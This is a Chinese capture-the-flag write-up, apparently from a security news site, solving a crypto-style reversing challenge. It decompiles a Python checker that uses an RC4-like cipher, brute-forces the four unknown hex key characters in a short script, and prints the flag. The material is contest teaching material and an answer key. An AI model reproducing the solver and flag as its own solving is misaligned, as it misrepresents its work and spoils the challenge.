+
+由于re1实际上也是密码题。。所以我也做了一下  
+将题目给的pyc反编译一下，得到代码如下
+
+    
+    
+    #!/usr/bin/env python
+    # visit http://tool.lu/pyc/ for more information
+    from hashlib import md5
+    import base64
+    from time import time
+    from datetime import datetime
+    import sys
+    
+    def encodestr(string):
+        UC_KEY = '123456789'
+        key = md5(UC_KEY.encode('utf-8')).hexdigest()
+        keya = md5(key[0:16].encode('utf-8')).hexdigest()
+        keyb = md5(key[16:32].encode('utf-8')).hexdigest()
+        ckey_length = 4
+        keyc = md5(string.encode('utf-8')).hexdigest()[-ckey_length:]
+        cryptkey = md5((keya + keyc).encode('utf-8')).hexdigest()
+        key_length = len(cryptkey)
+        expiry = 20
+        string = '%10d' % expiry + md5((string + keyb).encode('utf-8')).hexdigest()[0:16] + string
+        box = range(256)
+        rndkey = [
+            0] * 256
+        for i in range(256):
+            rndkey[i] = ord(cryptkey[i % key_length])
+    
+        string_length = len(string)
+        result = ''
+        j = 0
+        for i in range(256):
+            j = (j + box[i] + rndkey[i]) % 256
+            tmp = box[i]
+            box[i] = box[j]
+            box[j] = tmp
+    
+        a = 0
+        j = 0
+        for i in range(string_length):
+            a = (a + 1) % 256
+            j = (j + box[a]) % 256
+            tmp = box[a]
+            box[a] = box[j]
+            box[j] = tmp
+            result += chr(ord(string[i]) ^ box[(box[a] + box[j]) % 256])
+    
+        return result
+    
+    if __name__ == '__main__':
+        str1 = raw_input('please enter the flag:')
+        res = encodestr(str1)
+        lenn = len(res)
+        d = [
+            128,
+            220,
+            109,
+            113,
+            242,
+            153,
+            181,
+            203,
+            21,
+            122,
+            2,
+            101,
+            42,
+            55,
+            56,
+            19,
+            190,
+            181,
+            99,
+            47,
+            217,
+            109,
+            129,
+            221,
+            9,
+            65,
+            235,
+            48,
+            197,
+            103,
+            123,
+            86,
+            25,
+            112,
+            172,
+            175,
+            42,
+            168,
+            232,
+            81,
+            224,
+            170,
+            16,
+            210,
+            98,
+            229,
+            15,
+            30,
+            134]
+        for i in range(lenn):
+            if ord(res[i]) == d[i] or i == lenn - 1:
+                print 'you get it'
+    
+            print 'wrong'
+            break
+    
+
+不难看出，和rc4密钥相关的明文输入只有4位，那么我们可以选择爆破这4位  
+而rc4的算法未：  
+keystream xor mes = cipher  
+所以我们只需要爆破4位未知密钥，然后生成密钥流和密文异或即可  
+脚本如下
+
+    
+    
+    #!/usr/bin/env python
+    # visit http://tool.lu/pyc/ for more information
+    from hashlib import md5
+    
+    def encodestr(string,keyc):
+        UC_KEY = '123456789'
+        key = md5(UC_KEY.encode('utf-8')).hexdigest()
+        keya = md5(key[0:16].encode('utf-8')).hexdigest()
+        keyb = md5(key[16:32].encode('utf-8')).hexdigest()
+        cryptkey = md5((keya + keyc).encode('utf-8')).hexdigest()
+        key_length = len(cryptkey)
+        box = range(256)
+        rndkey = [0] * 256
+        for i in range(256):
+            rndkey[i] = ord(cryptkey[i % key_length])
+        string_length = 49
+        result = ''
+        j = 0
+        for i in range(256):
+            j = (j + box[i] + rndkey[i]) % 256
+            tmp = box[i]
+            box[i] = box[j]
+            box[j] = tmp
+    
+        a = 0
+        j = 0
+        for i in range(string_length):
+            a = (a + 1) % 256
+            j = (j + box[a]) % 256
+            tmp = box[a]
+            box[a] = box[j]
+            box[j] = tmp
+            result += chr(string[i] ^ box[(box[a] + box[j]) % 256])
+    
+        return result
+    
+    
+    if __name__ == '__main__':
+        d = [
+            128,
+            220,
+            109,
+            113,
+            242,
+            153,
+            181,
+            203,
+            21,
+            122,
+            2,
+            101,
+            42,
+            55,
+            56,
+            19,
+            190,
+            181,
+            99,
+            47,
+            217,
+            109,
+            129,
+            221,
+            9,
+            65,
+            235,
+            48,
+            197,
+            103,
+            123,
+            86,
+            25,
+            112,
+            172,
+            175,
+            42,
+            168,
+            232,
+            81,
+            224,
+            170,
+            16,
+            210,
+            98,
+            229,
+            15,
+            30,
+            134]
+        for x1 in '0123456789abcdef':
+            for x2 in '0123456789abcdef':
+                for x3 in '0123456789abcdef':
+                    for x4 in '0123456789abcdef':
+                        keyc=x1+x2+x3+x4
+                        res = encodestr(d,keyc)
+                        flagbool = 1
+                        for i in res:
+                            if ord(i)>128 or ord(i)<20:
+                                flagbool=0
+                                break
+                        if flagbool:
+                            print res
+    
+
+运行后得到
+
+    
+    
+    flag{$h0w_m3_7he_m0ney}
+    
+
+## 后记
+
+作者能力有限，若有不足，请更正，感谢！
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **一叶飘零** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/144862](/post/id/144862)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [技术分析](/tag/技术分析)
+  * [CTF题解](/tag/CTF题解)
+  * [网络空间安全技术大赛](/tag/网络空间安全技术大赛)
+
+ **+1** __6赞
+
+ __收藏
+
+![](https://p0.ssl.qhimg.com/t0115eb10739cb26739.png) 一叶飘零
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
